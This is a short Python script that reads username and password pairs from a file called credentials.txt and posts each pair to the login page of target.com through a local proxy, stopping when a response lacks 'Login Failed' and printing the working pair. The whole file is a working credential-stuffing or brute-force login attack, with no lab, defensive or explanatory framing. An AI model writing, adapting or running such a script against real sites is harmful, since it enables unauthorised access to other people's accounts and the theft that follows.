import requests
url = "https://www.target.com/login?client_id=ecom-web-1.0.0&ui_namespace=ui-default&back_button_action=browser&keep_me_signed_in=true&kmsi_default=false&actions=create_session_signin"
proxy = {
    "http": "127.0.0.1:8081"
}
with open("credentials.txt", "r") as file:
    lines = file.readlines()
    credentials_list = [line.strip().split() for line in lines]
for username, password in credentials_list:
    credentials = {
        "username": username,
        "password": password,
        "login": "Login"
    }
    req = requests.post(url, proxies=proxy, data=credentials)
    if req.text.find("Login Failed") == -1:
        print(f"[+] {username} and {password} are correct!!!")
        break
    else:
        print(f"[-] Login failed with {username} and {password}")
